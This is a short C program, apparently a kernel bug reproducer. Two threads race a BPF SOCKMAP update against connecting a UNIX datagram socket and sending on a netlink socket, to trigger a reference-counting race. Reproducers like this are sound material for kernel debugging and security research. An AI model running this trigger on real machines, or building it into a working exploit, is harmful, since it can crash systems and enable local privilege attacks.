//BUG：Reference counting race between BPF SOCKMAP updates and UNIX socket connections.
/* 6-bpf.c */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/syscall.h>
#include <linux/bpf.h>
#include <pthread.h>

int u_sock;

void *thread_bpf(void *arg) {
    union bpf_attr attr = {
        .map_type = BPF_MAP_TYPE_SOCKMAP,
        .key_size = 4,
        .value_size = 4,
        .max_entries = 1,
    };
    int map_fd = syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
    
    union bpf_attr attr_upd = {
        .map_fd = map_fd,
        .key = (unsigned long)&u_sock, 
        .value = (unsigned long)&u_sock,
    };
    syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr_upd, sizeof(attr_upd));
    return NULL;
}

void *thread_sock(void *arg) {
    struct sockaddr_un addr;
    addr.sun_family = AF_UNIX;
    strcpy(addr.sun_path, "./file0");
    connect(u_sock, (struct sockaddr*)&addr, sizeof(addr));
    int nl = socket(AF_NETLINK, SOCK_RAW, 0);
    sendmsg(nl, NULL, 0); 
    return NULL;
}

int main() {
    u_sock = socket(AF_UNIX, SOCK_DGRAM, 0);
    bind(u_sock, (struct sockaddr *)&(struct sockaddr_un){.sun_family=AF_UNIX, .sun_path="./file0"}, sizeof(short)+8);

    pthread_t t1, t2;
    pthread_create(&t1, NULL, thread_bpf, NULL);
    pthread_create(&t2, NULL, thread_sock, NULL);
    
    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    unlink("./file0");
    return 0;
}